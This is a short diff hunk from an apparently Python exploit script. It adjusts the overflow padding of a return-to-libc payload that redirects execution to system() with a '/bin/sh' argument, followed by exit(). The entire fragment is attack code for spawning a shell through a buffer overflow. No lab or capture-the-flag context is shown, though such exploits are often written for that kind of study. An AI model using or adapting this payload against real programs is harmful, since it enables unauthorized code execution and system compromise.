@@ -11,7 +11,7 @@ ret_addr = system_addr
 # Arguments to system() function
 arg1 = binsh_addr
 # Padding to overflow the buffer
-padding = b'A' * 44 + exit_addr + b'A' * 20 + arg1 + b'A' * 8
+padding = b'A' * 72 + arg1 + exit_addr
 
 
 # Build payload
